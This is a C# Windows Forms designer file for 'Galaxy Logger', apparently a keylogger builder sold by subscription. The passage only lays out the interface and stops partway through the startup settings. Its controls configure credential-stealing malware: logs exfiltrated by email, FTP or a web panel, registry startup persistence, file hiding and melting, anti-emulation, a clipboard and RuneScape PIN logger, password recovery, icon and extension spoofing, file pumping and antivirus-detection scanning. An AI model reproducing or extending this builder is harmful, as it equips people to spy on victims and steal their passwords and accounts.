namespace Galaxy_Logger
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.Windows.Forms.TreeNode treeNode1 = new System.Windows.Forms.TreeNode("Delivery");
            System.Windows.Forms.TreeNode treeNode2 = new System.Windows.Forms.TreeNode("Installation");
            System.Windows.Forms.TreeNode treeNode3 = new System.Windows.Forms.TreeNode("General");
            System.Windows.Forms.TreeNode treeNode4 = new System.Windows.Forms.TreeNode("Misc");
            System.Windows.Forms.TreeNode treeNode5 = new System.Windows.Forms.TreeNode("Password Recovery");
            System.Windows.Forms.TreeNode treeNode6 = new System.Windows.Forms.TreeNode("Assembly");
            System.Windows.Forms.TreeNode treeNode7 = new System.Windows.Forms.TreeNode("Build");
            System.Windows.Forms.TreeNode treeNode8 = new System.Windows.Forms.TreeNode("Keylogger", new System.Windows.Forms.TreeNode[] {
            treeNode1,
            treeNode2,
            treeNode3,
            treeNode4,
            treeNode5,
            treeNode6,
            treeNode7});
            System.Windows.Forms.TreeNode treeNode9 = new System.Windows.Forms.TreeNode("System Cure");
            System.Windows.Forms.TreeNode treeNode10 = new System.Windows.Forms.TreeNode("AV Scanner");
            System.Windows.Forms.TreeNode treeNode11 = new System.Windows.Forms.TreeNode("File Pumper");
            System.Windows.Forms.TreeNode treeNode12 = new System.Windows.Forms.TreeNode("Extension Spoofer");
            System.Windows.Forms.TreeNode treeNode13 = new System.Windows.Forms.TreeNode("Tool Box", new System.Windows.Forms.TreeNode[] {
            treeNode11,
            treeNode12});
            System.Windows.Forms.TreeNode treeNode14 = new System.Windows.Forms.TreeNode("News");
            System.Windows.Forms.TreeNode treeNode15 = new System.Windows.Forms.TreeNode("Account Info");
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.Theme = new NSTheme();
            this.treeView1 = new System.Windows.Forms.TreeView();
            this.nsControlButton1 = new NSControlButton();
            this.panelGeneral = new System.Windows.Forms.Panel();
            this.cbClearSavedPasswords = new Ambiance_CheckBox();
            this.cbRuneScapePinlogger = new Ambiance_CheckBox();
            this.cbProcessProtection = new Ambiance_CheckBox();
            this.cbAntiEmulation = new Ambiance_CheckBox();
            this.cbCaptureScreenshots = new Ambiance_CheckBox();
            this.cbMeltFile = new Ambiance_CheckBox();
            this.cbModifyTaskManager = new Ambiance_CheckBox();
            this.cbClipboardLogger = new Ambiance_CheckBox();
            this.lblMutex = new Ambiance_Label();
            this.tbMutex = new Amiance_TextBox();
            this.randomPool = new NSRandomPool();
            this.separator3 = new Ambiance_Separator();
            this.lblGeneralSettings = new Ambiance_HeaderLabel();
            this.panelInstallation = new System.Windows.Forms.Panel();
            this.gbOther = new System.Windows.Forms.GroupBox();
            this.cbHideFile = new Ambiance_CheckBox();
            this.cbStartupPersistence = new Ambiance_CheckBox();
            this.gbStartup = new System.Windows.Forms.GroupBox();
            this.cbHKLM = new Ambiance_CheckBox();
            this.cbHKCU = new Ambiance_CheckBox();
            this.tbHKLM = new Amiance_TextBox();
            this.tbHKCU = new Amiance_TextBox();
            this.gbInstallation = new System.Windows.Forms.GroupBox();
            this.tbProcess = new Amiance_TextBox();
            this.lblProcess = new Ambiance_Label();
            this.comboBoxDirectory = new Ambiance_ComboBox();
            this.lblSubfolder = new Ambiance_Label();
            this.tbSubfolder = new Amiance_TextBox();
            this.lblDirectory = new Ambiance_Label();
            this.cbInstallation = new Ambiance_Toggle();
            this.separator2 = new Ambiance_Separator();
            this.lblInstallation = new Ambiance_HeaderLabel();
            this.panelBuild = new System.Windows.Forms.Panel();
            this.pbIcon = new System.Windows.Forms.PictureBox();
            this.lbBuildLog = new Ambiance_ListBox();
            this.lblBuildLog = new Ambiance_Label();
            this.btnBrowseIcon = new Ambiance_Button_1();
            this.tbIconPath = new Amiance_TextBox();
            this.cbChangeIcon = new Ambiance_CheckBox();
            this.separator7 = new Ambiance_Separator();
            this.lblBuild = new Ambiance_HeaderLabel();
            this.btnBuild = new Ambiance_Button_1();
            this.panelAVScanner = new System.Windows.Forms.Panel();
            this.lvwScanner = new System.Windows.Forms.ListView();
            this.scanStatusLabel = new System.Windows.Forms.Label();
            this.avScanButton = new NSButton();
            this.scanbbcodeTextBox = new NSTextBox();
            this.scanLinkTextBox = new NSTextBox();
            this.scanRateTextBox = new NSTextBox();
            this.bbCodeLabel = new System.Windows.Forms.Label();
            this.linkLabel = new System.Windows.Forms.Label();
            this.rateLabel = new System.Windows.Forms.Label();
            this.scanBrowseTextbox = new NSTextBox();
            this.scanBrowseButton = new NSButton();
            this.panelNews = new System.Windows.Forms.Panel();
            this.newsLabel = new NSLabel();
            this.NewsText = new NSTextBox();
            this.panelDelivery = new System.Windows.Forms.Panel();
            this.btnTestDelivery = new Ambiance_Button_1();
            this.nudLogInterval = new Ambiance_NumericUpDown();
            this.lblLogInterval = new Ambiance_Label();
            this.gbWebPanel = new System.Windows.Forms.GroupBox();
            this.tbWebPanelUploadKey = new Amiance_TextBox();
            this.gbFTP = new System.Windows.Forms.GroupBox();
            this.tbFTPPassword = new Amiance_TextBox();
            this.tbFTPUsername = new Amiance_TextBox();
            this.tbFTPServer = new Amiance_TextBox();
            this.rbPanel = new Ambiance_RadioButton();
            this.rbFTP = new Ambiance_RadioButton();
            this.rbEmail = new Ambiance_RadioButton();
            this.gbEmail = new System.Windows.Forms.GroupBox();
            this.cbSSL = new Ambiance_CheckBox();
            this.tbEmailPort = new Amiance_TextBox();
            this.tbEmailServer = new Amiance_TextBox();
            this.tbEmailPassword = new Amiance_TextBox();
            this.tbEmailUsername = new Amiance_TextBox();
            this.separator1 = new Ambiance_Separator();
            this.lblDeliveryMethod = new Ambiance_HeaderLabel();
            this.panelAbout = new System.Windows.Forms.Panel();
            this.pbAbout = new System.Windows.Forms.PictureBox();
            this.separator9 = new Ambiance_Separator();
            this.lblAbout = new Ambiance_HeaderLabel();
            this.lblAboutInfo = new Ambiance_Label();
            this.panelKeylogger = new System.Windows.Forms.Panel();
            this.panelExtensionSpoofer = new System.Windows.Forms.Panel();
            this.cmdDoSpoofExt = new NSButton();
            this.nsButton2 = new NSButton();
            this.labelExt = new System.Windows.Forms.Label();
            this.textBoxSpoofExt = new NSTextBox();
            this.labelSpoofFilePath = new System.Windows.Forms.Label();
            this.ambiance_Separator2 = new Ambiance_Separator();
            this.ambiance_HeaderLabel6 = new Ambiance_HeaderLabel();
            this.panelAccountInfo = new System.Windows.Forms.Panel();
            this.webpanelButton = new NSButton();
            this.forumsButton = new NSButton();
            this.updateButton = new NSButton();
            this.subscriptionButton = new NSButton();
            this.onlineUsersText = new Ambiance_Label();
            this.ipAddressText = new Ambiance_Label();
            this.lastUpdateText = new Ambiance_Label();
            this.GUIDText = new Ambiance_Label();
            this.versionText = new Ambiance_Label();
            this.usernameText = new Ambiance_Label();
            this.ambiance_Separator3 = new Ambiance_Separator();
            this.ambiance_HeaderLabel7 = new Ambiance_HeaderLabel();
            this.onlineUsersLabel = new NSLabel();
            this.lastUpdateLabel = new NSLabel();
            this.versionLabel = new NSLabel();
            this.ipAddressLabel = new NSLabel();
            this.GUIDLabel = new NSLabel();
            this.usernameLabel = new NSLabel();
            this.panelAssembly = new System.Windows.Forms.Panel();
            this.lblVersion = new Ambiance_Label();
            this.lblCopyright = new Ambiance_Label();
            this.lblProduct = new Ambiance_Label();
            this.lblCompany = new Ambiance_Label();
            this.lblDescriptionAsm = new Ambiance_Label();
            this.lblTitle = new Ambiance_Label();
            this.tbVersion = new Amiance_TextBox();
            this.tbCopyright = new Amiance_TextBox();
            this.tbProduct = new Amiance_TextBox();
            this.tbCompany = new Amiance_TextBox();
            this.tbDescription = new Amiance_TextBox();
            this.tbTitle = new Amiance_TextBox();
            this.cbChangeAssembly = new Ambiance_CheckBox();
            this.separator6 = new Ambiance_Separator();
            this.lblAssembly = new Ambiance_HeaderLabel();
            this.panelSystemCure = new System.Windows.Forms.Panel();
            this.lblVaccineLog = new Ambiance_Label();
            this.lbVaccineLog = new Ambiance_ListBox();
            this.btnRemoveKeylogger = new Ambiance_Button_1();
            this.separator8 = new Ambiance_Separator();
            this.lblVaccine = new Ambiance_HeaderLabel();
            this.lblVaccineInfo = new Ambiance_Label();
            this.panelFilePumper = new System.Windows.Forms.Panel();
            this.cmdDoPumpFile = new NSButton();
            this.cmdSelectFileToPump = new NSButton();
            this.labelSize = new System.Windows.Forms.Label();
            this.textBoxPumpSize = new NSTextBox();
            this.labelPumpFilePath = new System.Windows.Forms.Label();
            this.ambiance_Separator1 = new Ambiance_Separator();
            this.ambiance_HeaderLabel5 = new Ambiance_HeaderLabel();
            this.panelPasswordRecovery = new System.Windows.Forms.Panel();
            this.lvPasswordRecovery = new System.Windows.Forms.ListView();
            this.chSoftware = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chVersions = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.cbPasswordRecovery = new Ambiance_Toggle();
            this.separator5 = new Ambiance_Separator();
            this.lblPasswordRecovery = new Ambiance_HeaderLabel();
            this.panelMiscellaneous = new System.Windows.Forms.Panel();
            this.lblDelayExecution = new Ambiance_Label();
            this.nudDelayExecution = new Ambiance_NumericUpDown();
            this.cbDelayExecution = new Ambiance_CheckBox();
            this.tbMessageBoxBody = new Amiance_TextBox();
            this.comboBoxMessageBoxType = new Ambiance_ComboBox();
            this.lblMessageBoxType = new Ambiance_Label();
            this.cbMessageBox = new Ambiance_CheckBox();
            this.tbMessageBoxTitle = new Amiance_TextBox();
            this.comboBoxFileType = new Ambiance_ComboBox();
            this.lblFileType = new Ambiance_Label();
            this.cbFileDownloader = new Ambiance_CheckBox();
            this.tbFileDownloader = new Amiance_TextBox();
            this.separator4 = new Ambiance_Separator();
            this.lblMiscellaneousSettings = new Ambiance_HeaderLabel();
            this.Theme.SuspendLayout();
            this.panelGeneral.SuspendLayout();
            this.panelInstallation.SuspendLayout();
            this.gbOther.SuspendLayout();
            this.gbStartup.SuspendLayout();
            this.gbInstallation.SuspendLayout();
            this.panelBuild.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbIcon)).BeginInit();
            this.panelAVScanner.SuspendLayout();
            this.panelNews.SuspendLayout();
            this.panelDelivery.SuspendLayout();
            this.gbWebPanel.SuspendLayout();
            this.gbFTP.SuspendLayout();
            this.gbEmail.SuspendLayout();
            this.panelAbout.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbAbout)).BeginInit();
            this.panelExtensionSpoofer.SuspendLayout();
            this.panelAccountInfo.SuspendLayout();
            this.panelAssembly.SuspendLayout();
            this.panelSystemCure.SuspendLayout();
            this.panelFilePumper.SuspendLayout();
            this.panelPasswordRecovery.SuspendLayout();
            this.panelMiscellaneous.SuspendLayout();
            this.SuspendLayout();
            // 
            // Theme
            // 
            this.Theme.AccentOffset = 0;
            this.Theme.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.Theme.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Theme.Colors = new Bloom[0];
            this.Theme.Controls.Add(this.treeView1);
            this.Theme.Controls.Add(this.nsControlButton1);
            this.Theme.Controls.Add(this.panelGeneral);
            this.Theme.Controls.Add(this.panelInstallation);
            this.Theme.Controls.Add(this.panelBuild);
            this.Theme.Controls.Add(this.panelAVScanner);
            this.Theme.Controls.Add(this.panelNews);
            this.Theme.Controls.Add(this.panelDelivery);
            this.Theme.Controls.Add(this.panelAbout);
            this.Theme.Controls.Add(this.panelKeylogger);
            this.Theme.Controls.Add(this.panelExtensionSpoofer);
            this.Theme.Controls.Add(this.panelAccountInfo);
            this.Theme.Controls.Add(this.panelAssembly);
            this.Theme.Controls.Add(this.panelSystemCure);
            this.Theme.Controls.Add(this.panelFilePumper);
            this.Theme.Controls.Add(this.panelPasswordRecovery);
            this.Theme.Controls.Add(this.panelMiscellaneous);
            this.Theme.Customization = "";
            this.Theme.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Theme.Font = new System.Drawing.Font("Verdana", 8F);
            this.Theme.Image = null;
            this.Theme.Location = new System.Drawing.Point(0, 0);
            this.Theme.MinimumSize = new System.Drawing.Size(765, 518);
            this.Theme.Movable = true;
            this.Theme.Name = "Theme";
            this.Theme.NoRounding = false;
            this.Theme.Sizable = true;
            this.Theme.Size = new System.Drawing.Size(765, 518);
            this.Theme.SmartBounds = true;
            this.Theme.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation;
            this.Theme.TabIndex = 0;
            this.Theme.Text = "Galaxy Logger";
            this.Theme.TransparencyKey = System.Drawing.Color.Empty;
            this.Theme.Transparent = false;
            this.Theme.Click += new System.EventHandler(this.Theme_Click);
            // 
            // treeView1
            // 
            this.treeView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.treeView1.Location = new System.Drawing.Point(12, 45);
            this.treeView1.Name = "treeView1";
            treeNode1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode1.Name = "DeliveryNode";
            treeNode1.Text = "Delivery";
            treeNode2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode2.Name = "InstallationNode";
            treeNode2.Text = "Installation";
            treeNode3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode3.Name = "GeneralNode";
            treeNode3.Text = "General";
            treeNode4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode4.Name = "MiscNode";
            treeNode4.Text = "Misc";
            treeNode5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode5.Name = "PasswordNode";
            treeNode5.Text = "Password Recovery";
            treeNode6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode6.Name = "AssemblyNode";
            treeNode6.Text = "Assembly";
            treeNode7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode7.Name = "nodeBuild";
            treeNode7.Text = "Build";
            treeNode8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode8.Name = "keyloggerNode";
            treeNode8.Text = "Keylogger";
            treeNode9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode9.Name = "systemCureNode";
            treeNode9.Text = "System Cure";
            treeNode10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode10.Name = "scannerNode";
            treeNode10.Text = "AV Scanner";
            treeNode11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode11.Name = "filePumperNode";
            treeNode11.Text = "File Pumper";
            treeNode12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode12.Name = "extensionSpooferNode";
            treeNode12.Text = "Extension Spoofer";
            treeNode13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode13.Name = "toolBoxNode";
            treeNode13.Text = "Tool Box";
            treeNode14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode14.Name = "newsNode";
            treeNode14.Text = "News";
            treeNode15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            treeNode15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            treeNode15.Name = "AccountInfoNode";
            treeNode15.Text = "Account Info";
            this.treeView1.Nodes.AddRange(new System.Windows.Forms.TreeNode[] {
            treeNode8,
            treeNode9,
            treeNode10,
            treeNode13,
            treeNode14,
            treeNode15});
            this.treeView1.Size = new System.Drawing.Size(217, 435);
            this.treeView1.TabIndex = 0;
            this.treeView1.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.treeView1_AfterSelect);
            // 
            // nsControlButton1
            // 
            this.nsControlButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.nsControlButton1.ControlButton = NSControlButton.Button.Close;
            this.nsControlButton1.Location = new System.Drawing.Point(747, 0);
            this.nsControlButton1.Margin = new System.Windows.Forms.Padding(0);
            this.nsControlButton1.MaximumSize = new System.Drawing.Size(18, 20);
            this.nsControlButton1.MinimumSize = new System.Drawing.Size(18, 20);
            this.nsControlButton1.Name = "nsControlButton1";
            this.nsControlButton1.Size = new System.Drawing.Size(18, 20);
            this.nsControlButton1.TabIndex = 8;
            this.nsControlButton1.Text = "nsControlButton1";
            this.nsControlButton1.Click += new System.EventHandler(this.nsControlButton1_Click);
            // 
            // panelGeneral
            // 
            this.panelGeneral.Controls.Add(this.cbClearSavedPasswords);
            this.panelGeneral.Controls.Add(this.cbRuneScapePinlogger);
            this.panelGeneral.Controls.Add(this.cbProcessProtection);
            this.panelGeneral.Controls.Add(this.cbAntiEmulation);
            this.panelGeneral.Controls.Add(this.cbCaptureScreenshots);
            this.panelGeneral.Controls.Add(this.cbMeltFile);
            this.panelGeneral.Controls.Add(this.cbModifyTaskManager);
            this.panelGeneral.Controls.Add(this.cbClipboardLogger);
            this.panelGeneral.Controls.Add(this.lblMutex);
            this.panelGeneral.Controls.Add(this.tbMutex);
            this.panelGeneral.Controls.Add(this.randomPool);
            this.panelGeneral.Controls.Add(this.separator3);
            this.panelGeneral.Controls.Add(this.lblGeneralSettings);
            this.panelGeneral.Location = new System.Drawing.Point(239, 45);
            this.panelGeneral.Name = "panelGeneral";
            this.panelGeneral.Size = new System.Drawing.Size(498, 435);
            this.panelGeneral.TabIndex = 27;
            this.panelGeneral.Visible = false;
            // 
            // cbClearSavedPasswords
            // 
            this.cbClearSavedPasswords.BackColor = System.Drawing.Color.Transparent;
            this.cbClearSavedPasswords.Checked = false;
            this.cbClearSavedPasswords.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbClearSavedPasswords.Location = new System.Drawing.Point(272, 353);
            this.cbClearSavedPasswords.Name = "cbClearSavedPasswords";
            this.cbClearSavedPasswords.Size = new System.Drawing.Size(204, 19);
            this.cbClearSavedPasswords.TabIndex = 29;
            this.cbClearSavedPasswords.Text = "Clear Saved Passwords";
            // 
            // cbRuneScapePinlogger
            // 
            this.cbRuneScapePinlogger.BackColor = System.Drawing.Color.Transparent;
            this.cbRuneScapePinlogger.Checked = false;
            this.cbRuneScapePinlogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbRuneScapePinlogger.Location = new System.Drawing.Point(272, 310);
            this.cbRuneScapePinlogger.Name = "cbRuneScapePinlogger";
            this.cbRuneScapePinlogger.Size = new System.Drawing.Size(204, 19);
            this.cbRuneScapePinlogger.TabIndex = 28;
            this.cbRuneScapePinlogger.Text = "RuneScape Pinlogger";
            // 
            // cbProcessProtection
            // 
            this.cbProcessProtection.BackColor = System.Drawing.Color.Transparent;
            this.cbProcessProtection.Checked = false;
            this.cbProcessProtection.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbProcessProtection.Location = new System.Drawing.Point(272, 266);
            this.cbProcessProtection.Name = "cbProcessProtection";
            this.cbProcessProtection.Size = new System.Drawing.Size(204, 19);
            this.cbProcessProtection.TabIndex = 27;
            this.cbProcessProtection.Text = "Process Protection";
            // 
            // cbAntiEmulation
            // 
            this.cbAntiEmulation.BackColor = System.Drawing.Color.Transparent;
            this.cbAntiEmulation.Checked = false;
            this.cbAntiEmulation.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbAntiEmulation.Location = new System.Drawing.Point(272, 223);
            this.cbAntiEmulation.Name = "cbAntiEmulation";
            this.cbAntiEmulation.Size = new System.Drawing.Size(128, 19);
            this.cbAntiEmulation.TabIndex = 26;
            this.cbAntiEmulation.Text = "Anti-Emulation";
            // 
            // cbCaptureScreenshots
            // 
            this.cbCaptureScreenshots.BackColor = System.Drawing.Color.Transparent;
            this.cbCaptureScreenshots.Checked = false;
            this.cbCaptureScreenshots.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbCaptureScreenshots.Location = new System.Drawing.Point(30, 353);
            this.cbCaptureScreenshots.Name = "cbCaptureScreenshots";
            this.cbCaptureScreenshots.Size = new System.Drawing.Size(172, 19);
            this.cbCaptureScreenshots.TabIndex = 25;
            this.cbCaptureScreenshots.Text = "Capture Screenshots";
            // 
            // cbMeltFile
            // 
            this.cbMeltFile.BackColor = System.Drawing.Color.Transparent;
            this.cbMeltFile.Checked = false;
            this.cbMeltFile.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbMeltFile.Location = new System.Drawing.Point(30, 310);
            this.cbMeltFile.Name = "cbMeltFile";
            this.cbMeltFile.Size = new System.Drawing.Size(204, 19);
            this.cbMeltFile.TabIndex = 24;
            this.cbMeltFile.Text = "Melt File";
            // 
            // cbModifyTaskManager
            // 
            this.cbModifyTaskManager.BackColor = System.Drawing.Color.Transparent;
            this.cbModifyTaskManager.Checked = false;
            this.cbModifyTaskManager.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbModifyTaskManager.Location = new System.Drawing.Point(30, 266);
            this.cbModifyTaskManager.Name = "cbModifyTaskManager";
            this.cbModifyTaskManager.Size = new System.Drawing.Size(204, 19);
            this.cbModifyTaskManager.TabIndex = 23;
            this.cbModifyTaskManager.Text = "Modify Task Manager";
            // 
            // cbClipboardLogger
            // 
            this.cbClipboardLogger.BackColor = System.Drawing.Color.Transparent;
            this.cbClipboardLogger.Checked = false;
            this.cbClipboardLogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbClipboardLogger.Location = new System.Drawing.Point(30, 223);
            this.cbClipboardLogger.Name = "cbClipboardLogger";
            this.cbClipboardLogger.Size = new System.Drawing.Size(204, 19);
            this.cbClipboardLogger.TabIndex = 22;
            this.cbClipboardLogger.Text = "Clipboard Logger";
            // 
            // lblMutex
            // 
            this.lblMutex.AutoSize = true;
            this.lblMutex.BackColor = System.Drawing.Color.Transparent;
            this.lblMutex.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblMutex.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMutex.Location = new System.Drawing.Point(24, 181);
            this.lblMutex.Name = "lblMutex";
            this.lblMutex.Size = new System.Drawing.Size(53, 20);
            this.lblMutex.TabIndex = 21;
            this.lblMutex.Text = "Mutex:";
            // 
            // tbMutex
            // 
            this.tbMutex.BackColor = System.Drawing.Color.Transparent;
            this.tbMutex.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMutex.ForeColor = System.Drawing.Color.DimGray;
            this.tbMutex.Location = new System.Drawing.Point(81, 178);
            this.tbMutex.MaxLength = 32767;
            this.tbMutex.Multiline = false;
            this.tbMutex.Name = "tbMutex";
            this.tbMutex.ReadOnly = false;
            this.tbMutex.Size = new System.Drawing.Size(391, 28);
            this.tbMutex.TabIndex = 20;
            this.tbMutex.Text = "Drag your mouse in the box above";
            this.tbMutex.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMutex.UseSystemPasswordChar = false;
            // 
            // randomPool
            // 
            this.randomPool.Location = new System.Drawing.Point(26, 56);
            this.randomPool.Name = "randomPool";
            this.randomPool.Size = new System.Drawing.Size(446, 111);
            this.randomPool.TabIndex = 19;
            this.randomPool.Text = "nsRandomPool1";
            this.randomPool.ValueChanged += new NSRandomPool.ValueChangedEventHandler(this.randomPool_ValueChanged_1);
            // 
            // separator3
            // 
            this.separator3.Location = new System.Drawing.Point(26, 37);
            this.separator3.Name = "separator3";
            this.separator3.Size = new System.Drawing.Size(446, 10);
            this.separator3.TabIndex = 18;
            this.separator3.Text = "ambiance_Separator2";
            // 
            // lblGeneralSettings
            // 
            this.lblGeneralSettings.AutoSize = true;
            this.lblGeneralSettings.BackColor = System.Drawing.Color.Transparent;
            this.lblGeneralSettings.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblGeneralSettings.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblGeneralSettings.Location = new System.Drawing.Point(24, 15);
            this.lblGeneralSettings.Name = "lblGeneralSettings";
            this.lblGeneralSettings.Size = new System.Drawing.Size(124, 20);
            this.lblGeneralSettings.TabIndex = 17;
            this.lblGeneralSettings.Text = "General Settings";
            // 
            // panelInstallation
            // 
            this.panelInstallation.Controls.Add(this.gbOther);
            this.panelInstallation.Controls.Add(this.gbStartup);
            this.panelInstallation.Controls.Add(this.gbInstallation);
            this.panelInstallation.Controls.Add(this.cbInstallation);
            this.panelInstallation.Controls.Add(this.separator2);
            this.panelInstallation.Controls.Add(this.lblInstallation);
            this.panelInstallation.Location = new System.Drawing.Point(242, 45);
            this.panelInstallation.Name = "panelInstallation";
            this.panelInstallation.Size = new System.Drawing.Size(498, 435);
            this.panelInstallation.TabIndex = 25;
            this.panelInstallation.Visible = false;
            // 
            // gbOther
            // 
            this.gbOther.Controls.Add(this.cbHideFile);
            this.gbOther.Controls.Add(this.cbStartupPersistence);
            this.gbOther.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbOther.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbOther.Location = new System.Drawing.Point(26, 327);
            this.gbOther.Name = "gbOther";
            this.gbOther.Size = new System.Drawing.Size(446, 61);
            this.gbOther.TabIndex = 19;
            this.gbOther.TabStop = false;
            this.gbOther.Text = "Other";
            // 
            // cbHideFile
            // 
            this.cbHideFile.BackColor = System.Drawing.Color.Transparent;
            this.cbHideFile.Checked = false;
            this.cbHideFile.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHideFile.Location = new System.Drawing.Point(297, 28);
            this.cbHideFile.Name = "cbHideFile";
            this.cbHideFile.Size = new System.Drawing.Size(94, 19);
            this.cbHideFile.TabIndex = 16;
            this.cbHideFile.Text = "Hide File";
            // 
            // cbStartupPersistence
            // 
            this.cbStartupPersistence.BackColor = System.Drawing.Color.Transparent;
            this.cbStartupPersistence.Checked = false;
            this.cbStartupPersistence.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbStartupPersistence.Location = new System.Drawing.Point(38, 28);
            this.cbStartupPersistence.Name = "cbStartupPersistence";
            this.cbStartupPersistence.Size = new System.Drawing.Size(165, 19);
            this.cbStartupPersistence.TabIndex = 15;
            this.cbStartupPersistence.Text = "Startup Persistence";
            // 
            // gbStartup
            // 
            this.gbStartup.Controls.Add(this.cbHKLM);
